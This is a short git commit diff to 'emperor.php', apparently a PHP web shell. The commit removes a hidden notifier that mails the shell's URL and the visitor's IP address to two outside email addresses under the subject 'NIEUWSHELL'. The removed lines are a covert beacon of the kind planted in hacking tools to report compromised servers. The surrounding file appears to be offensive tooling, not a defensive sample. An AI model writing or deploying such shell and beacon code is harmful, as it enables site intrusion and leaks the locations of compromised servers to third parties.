7fa7aa976cb8f24106da086e397258535e0caa43
president32 <99405846+president32@users.noreply.github.com>
2022-04-24 18:51:53 +0100

    Update emperor.php

--- emperor.php
+++ emperor.php
@@ -8,8 +8,4 @@
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'jersongasso@gmail.com,voordiesmtps@outlook.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "NIEUWSHELL", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
